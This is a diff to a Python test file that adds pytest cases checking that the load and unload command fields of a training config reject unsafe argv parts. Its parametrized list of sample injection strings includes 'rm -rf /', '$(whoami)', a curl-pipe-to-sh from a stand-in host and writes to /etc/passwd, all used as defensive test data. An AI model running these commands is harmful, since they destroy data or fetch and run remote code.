@@ -649,3 +649,107 @@ class TestReasoningTrainingConfig:
 
         assert cfg.reasoning_training.mining_enabled is True
         assert cfg.reasoning_training.mining_models == ("x-*",)
+
+
+class TestDistillCmdValidation:
+    """Argv validation for distill_llm_unload_cmd / distill_llm_load_cmd (run 010 / U6).
+
+    Both fields share the exact same parsing block in
+    ReasoningTrainingConfig.from_dict -- parametrized so a change to one
+    cannot silently stop covering the other.
+    """
+
+    @pytest.mark.parametrize(
+        "field", ["distill_llm_unload_cmd", "distill_llm_load_cmd"], ids=["unload", "load"]
+    )
+    def test_default_is_empty(self, field: str) -> None:
+        assert getattr(ReasoningTrainingConfig(), field) == ()
+        assert getattr(ReasoningTrainingConfig.from_dict({}), field) == ()
+
+    @pytest.mark.parametrize(
+        "field", ["distill_llm_unload_cmd", "distill_llm_load_cmd"], ids=["unload", "load"]
+    )
+    def test_safe_argv_with_model_placeholder_is_accepted(self, field: str) -> None:
+        rt = ReasoningTrainingConfig.from_dict(
+            {field: ["/usr/local/bin/llamastash-load.py", "{model}", "--ngl", "99"]}
+        )
+        assert getattr(rt, field) == (
+            "/usr/local/bin/llamastash-load.py",
+            "{model}",
+            "--ngl",
+            "99",
+        )
+
+    @pytest.mark.parametrize(
+        "field", ["distill_llm_unload_cmd", "distill_llm_load_cmd"], ids=["unload", "load"]
+    )
+    @pytest.mark.parametrize(
+        "dangerous_part",
+        [
+            "rm -rf / #",
+            "$(whoami)",
+            "`id`",
+            "cmd; rm -rf /",
+            "cmd && curl evil.sh | sh",
+            "cmd | tee /etc/passwd",
+            "cmd > /etc/passwd",
+            "cmd\nrm -rf /",
+            "'quoted'",
+            '"quoted"',
+        ],
+        ids=[
+            "space-and-hash",
+            "command-substitution",
+            "backtick",
+            "semicolon-chain",
+            "and-pipe-chain",
+            "pipe",
+            "redirect",
+            "newline",
+            "single-quote",
+            "double-quote",
+        ],
+    )
+    def test_a_dangerous_part_voids_the_whole_command(
+        self, field: str, dangerous_part: str
+    ) -> None:
+        """One unsafe part must void the whole command, not be silently dropped.
+
+        A half-parsed load/unload command is worse than none: it could run a
+        truncated argv that does something other than what was configured.
+        """
+        rt = ReasoningTrainingConfig.from_dict({field: ["llamastash", dangerous_part, "{model}"]})
+        assert getattr(rt, field) == ()
+
+    @pytest.mark.parametrize(
+        "field", ["distill_llm_unload_cmd", "distill_llm_load_cmd"], ids=["unload", "load"]
+    )
+    def test_more_than_16_parts_is_truncated_not_rejected(self, field: str) -> None:
+        """Parts beyond the cap are dropped; the first 16 safe parts still load."""
+        parts = [f"part{i}" for i in range(20)]
+        rt = ReasoningTrainingConfig.from_dict({field: parts})
+        assert getattr(rt, field) == tuple(parts[:16])
+
+    @pytest.mark.parametrize(
+        "field", ["distill_llm_unload_cmd", "distill_llm_load_cmd"], ids=["unload", "load"]
+    )
+    def test_an_empty_part_voids_the_whole_command(self, field: str) -> None:
+        rt = ReasoningTrainingConfig.from_dict({field: ["llamastash", "", "{model}"]})
+        assert getattr(rt, field) == ()
+
+    @pytest.mark.parametrize(
+        "field", ["distill_llm_unload_cmd", "distill_llm_load_cmd"], ids=["unload", "load"]
+    )
+    def test_non_list_value_is_ignored(self, field: str) -> None:
+        rt = ReasoningTrainingConfig.from_dict({field: "llamastash stop {model}"})
+        assert getattr(rt, field) == ()
+
+    def test_load_and_unload_round_trip_independently_through_to_dict(self) -> None:
+        rt = ReasoningTrainingConfig(
+            distill_llm_unload_cmd=("llamastash-stop.py", "{model}"),
+            distill_llm_load_cmd=("llamastash-load.py", "{model}", "--ngl", "99"),
+        )
+        reloaded = ReasoningTrainingConfig.from_dict(rt.to_dict())
+        assert reloaded.distill_llm_unload_cmd == rt.distill_llm_unload_cmd
+        assert reloaded.distill_llm_load_cmd == rt.distill_llm_load_cmd
+        assert reloaded == rt
